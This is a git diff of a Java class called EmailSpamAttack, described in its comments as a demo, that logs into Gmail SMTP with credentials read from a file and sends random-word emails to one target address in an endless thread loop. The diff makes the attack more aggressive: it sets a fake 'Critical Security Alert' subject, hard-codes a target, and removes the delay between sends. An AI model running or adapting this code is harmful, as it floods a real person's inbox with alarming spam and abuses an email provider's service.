@@ -28,45 +28,48 @@ import jakarta.mail.internet.MimeMultipart;
  * to be enabled on the vulnerable account.
  * <P>
  * As said before, this is a demo. This requires a previous step: less secure
- * access for apps.
+ * access for apps on the 'from' account.
  * 
  * @author Pranav Amarnath
- * @version April 18, 2021
+ * @version April 19, 2021
  *
  */
 public class EmailSpamAttack {
 
-	private String USERNAME;
-	private String PASSWORD;
+	private String username;
+	private String password;
 	private final String PATH = "/credentials.txt";
+	private final String TARGET = "target@gmail.com";
+	private final String SUBJECT = "Critical Security Alert";
 	private Session emailSession;
 	private Transport emailTransport;
 
 	/**
-	 * Constructor that uses Jakarta Mail to access emails.
+	 * Constructor to start the process.
 	 */
 	public EmailSpamAttack() {
 		try {
-			readMail();
+			initClient();
 		} catch (MessagingException e) {
 			e.printStackTrace();
 		}
 	}
 
 	/**
-	 * Reads the mail and sets up SMTP.
+	 * Sets up SMTP.
 	 * 
 	 * @throws MessagingException
 	 */
-	private void readMail() throws MessagingException {
+	private void initClient() throws MessagingException {
 		readFile();
 
 		// create properties field
 		Properties properties = System.getProperties();
-		properties.setProperty("mail.user", USERNAME);
-		properties.setProperty("mail.password", PASSWORD);
+		properties.setProperty("mail.user", username);
+		properties.setProperty("mail.password", password);
 		properties.put("mail.smtp.ssl.enable", "true");
 		properties.put("mail.smtp.starttls.enable", "true");
+		properties.put("mail.smtp.starttls.required", "true");
 		properties.setProperty("mail.smtp.host", "smtp.gmail.com");
 		properties.setProperty("mail.smtp.port", "465");
 		properties.setProperty("mail.smtp.auth", "true");
@@ -74,7 +77,7 @@ public class EmailSpamAttack {
 		emailSession = Session.getDefaultInstance(properties);
 
 		emailTransport = emailSession.getTransport();
-		emailTransport.connect(USERNAME, PASSWORD);
+		emailTransport.connect(username, password);
 
 		startLoop(); // start loop for incoming messages
 	}
@@ -90,10 +93,10 @@ public class EmailSpamAttack {
 				int i = 0;
 				while((line = br.readLine()) != null) {
 					if(i % 2 == 0) {
-						USERNAME = line;
+						username = line;
 					}
 					else {
-						PASSWORD = line;
+						password = line;
 						break; // Even if there are other usernames and passwords, we only want the first pair.
 					}
 					i++;
@@ -116,24 +119,20 @@ public class EmailSpamAttack {
 				try {
 					System.out.println("[LOG] Sending mail...");
 					// Send a mail with random 12 letters.
-					sendEmail(System.getProperties(), "pranny2k@gmail.com", "Get started with your new Gmail account", String.join(" ", generateRandomWords(12)));
+					sendEmail(System.getProperties(), TARGET, SUBJECT, String.join(" ", generateRandomWords(10)));
 				} catch (AddressException e) {
 					e.printStackTrace();
 				} catch (MessagingException e) {
 					e.printStackTrace();
 				}
 				System.out.println("[LOG] Sent mail!");
-				try {
-					Thread.sleep(200); // Wait time
-				} catch (InterruptedException e) {
-					e.printStackTrace();
-				}
 			}
 		}).start();
 	}
 
 	/**
 	 * Generates an array of random letters in words.
+	 * See https://stackoverflow.com/a/4952066/13772184.
 	 * 
 	 * @param numberOfWords the number of words to return
 	 * @return the String array of words
@@ -166,7 +165,7 @@ public class EmailSpamAttack {
 		// creates a new e-mail message
 		Message msg = new MimeMessage(emailSession);
 
-		msg.setFrom(new InternetAddress(USERNAME));
+		msg.setFrom(new InternetAddress(username));
 		InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
 		msg.setRecipients(Message.RecipientType.TO, toAddresses);
 		msg.setSubject(subject);
